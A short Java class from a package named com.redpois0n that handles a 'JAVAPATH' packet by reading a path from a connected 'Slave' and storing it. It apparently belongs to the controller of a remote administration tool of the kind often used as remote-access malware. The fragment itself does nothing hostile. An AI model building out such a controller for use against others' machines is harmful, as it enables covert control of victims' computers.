package com.redpois0n.packets;

import com.redpois0n.Slave;

public class PacketJAVAPATH extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {

		String path = slave.readLine();
		slave.setJavaPath(path);

	}

}
